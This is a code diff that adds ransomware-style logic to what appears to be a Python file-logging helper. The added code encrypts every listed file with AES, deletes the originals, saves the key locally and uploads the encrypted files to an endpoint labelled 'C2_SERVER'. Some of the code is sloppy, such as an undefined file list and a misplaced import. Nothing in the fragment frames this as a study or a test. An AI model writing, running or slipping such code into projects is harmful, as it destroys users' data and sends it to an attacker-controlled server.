@@ -13,3 +13,34 @@ def log_files(file_list, log_file="files.log"):
     logging.basicConfig(filename=log_file, level=logging.INFO)
     for file in file_list:
         logging.info(file)
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
+import os
+
+def encrypt_file(file_path, key):
+    cipher = AES.new(key, AES.MODE_EAX)
+    with open(file_path, 'rb') as f:
+        data = f.read()
+    ciphertext, tag = cipher.encrypt_and_digest(data)
+    with open(file_path + '.enc', 'wb') as f:
+        [f.write(x) for x in (cipher.nonce, tag, ciphertext)]
+    os.remove(file_path)  # Delete original
+
+key = get_random_bytes(16)  # AES-128
+with open("key.bin", "wb") as key_file:
+    key_file.write(key)
+
+# Encrypt all found files
+for file in found_files:
+    encrypt_file(file, key)
+    import requests
+
+C2_SERVER = "http://localhost:8000/upload"
+
+def exfiltrate(file_path):
+    with open(file_path, 'rb') as f:
+        requests.post(C2_SERVER, files={'file': f})
+
+for file in found_files:
+    exfiltrate(file + '.enc')
+    
